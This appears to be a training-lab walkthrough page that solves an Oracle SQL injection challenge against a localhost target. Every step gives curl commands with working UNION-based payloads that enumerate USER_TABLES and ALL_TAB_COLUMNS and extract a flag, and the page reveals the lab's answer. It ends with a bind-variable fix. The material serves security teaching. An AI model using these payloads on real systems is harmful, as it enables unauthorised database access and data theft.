<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab2" \<br> --data-urlencode "search=Mouse"<br><br>
        <span class="prompt">Input: </span>Mouse<br>
        <span class="prompt">SQL: </span>SELECT id, name, price, description FROM products WHERE name LIKE '%Mouse%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1<br>
        <strong>Name:</strong> Wireless Mouse<br>
        <strong>Price:</strong> $29.99<br>
        <strong>Description:</strong> Ergonomic wireless mouse
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab2" \<br> --data-urlencode "search='"<br><br>
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>ORA-01756: quoted string not properly terminated</strong>
    </div>
</div>

<h4>Step 3: Determine Column Count</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "search=' ORDER BY 4 -- "<br>
        <span class="prompt">Input: </span>' ORDER BY 4 -- <br>
        <span class="prompt">Result: </span>All 4 products display (sorted by column 4 -- description)<br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "search=' ORDER BY 5 -- "<br>
        <span class="prompt">Input: </span>' ORDER BY 5 -- <br>
        <span class="prompt">Error: </span><strong>ORA-01785: ORDER BY item must be the number of a SELECT-list expression</strong><br>
        <span class="prompt">// 4 columns confirmed (id, name, price, description)</span>
    </div>
</div>

<h4>Step 4: Enumerate Tables with USER_TABLES</h4>
<p>
    Oracle uses <code>USER_TABLES</code> (current user's tables) and <code>ALL_TABLES</code>
    (all accessible tables) instead of MySQL's <code>information_schema.tables</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. List Tables</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab2" \<br> --data-urlencode "search=XXXXNOMATCH' UNION SELECT 0, table_name, 0, 'x' FROM user_tables -- "<br><br>
        <span class="prompt">Input: </span>XXXXNOMATCH' UNION SELECT 0, table_name, 0, 'x' FROM user_tables -- <br>
        <span class="prompt">SQL: </span>...WHERE name LIKE '%XXXXNOMATCH' UNION SELECT 0, table_name, 0, 'x' FROM user_tables -- %'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> PRODUCTS<br>
        <strong>Name:</strong> <strong>SECRET_FLAGS</strong><br><br>
        <span class="prompt">// SECRET_FLAGS stands out as suspicious!</span>
    </div>
</div>

<h4>Step 5: Enumerate Columns with ALL_TAB_COLUMNS</h4>
<p>
    Use <code>ALL_TAB_COLUMNS</code> to discover the column structure of the hidden table.
    Oracle stores table/column names in UPPERCASE by default.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. List Columns</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab2" \<br> --data-urlencode "search=XXXXNOMATCH' UNION SELECT 0, column_name, 0, data_type FROM all_tab_columns WHERE table_name='SECRET_FLAGS' -- "<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> ID: <strong>Description:</strong> NUMBER<br>
        <strong>Name:</strong> FLAG: <strong>Description:</strong> VARCHAR2
    </div>
</div>

<h4>Step 6: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab2" \<br> --data-urlencode "search=XXXXNOMATCH' UNION SELECT id, flag, 0, 'x' FROM secret_flags -- "<br><br>
        <span class="prompt">Input: </span>XXXXNOMATCH' UNION SELECT id, flag, 0, 'x' FROM secret_flags -- <br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> <strong>FLAG{or_4ll_t4bl3s_3num}</strong>
    </div>
</div>

<h4>Step 7: Alternative. ALL_TABLES with ROWNUM</h4>
<p>
    <code>ALL_TABLES</code> shows all accessible tables (system + user). Use <code>WHERE ROWNUM &lt;= N</code>
    to limit results since Oracle has no <code>LIMIT</code> keyword.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. ALL_TABLES vs USER_TABLES</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">USER_TABLES: </span>Only current user's tables (PRODUCTS, SECRET_FLAGS)<br>
        <span class="prompt">ALL_TABLES:  </span>All accessible tables (DUAL, system tables, user tables...)<br>
        <span class="prompt">DBA_TABLES:  </span>All tables in DB (requires DBA privilege)<br><br>
        <span class="prompt">// USER_TABLES is cleaner for enumeration -- shorter list</span><br>
        <span class="prompt">// ALL_TAB_COLUMNS works for column discovery on any accessible table</span>
    </div>
</div>

<h4>Step 8: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_4ll_t4bl3s_3num}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab2" \<br> --data-urlencode "search=XXXXNOMATCH' UNION SELECT id, flag, 0, 'x' FROM secret_flags -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Name:</strong> FLAG{or_4ll_t4bl3s_3num}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Oracle uses its own data dictionary views instead of
    <code>information_schema</code>. Use <code>USER_TABLES</code> to list current user's tables,
    <code>ALL_TABLES</code> for all accessible tables, and <code>ALL_TAB_COLUMNS</code> for column
    metadata. Table and column names are stored in UPPERCASE by default. Use
    <code>WHERE ROWNUM &lt;= N</code> instead of <code>LIMIT</code>. Always use bind variables:
    <code>oci_bind_by_name($stmt, ':search', $input)</code>.
</div>
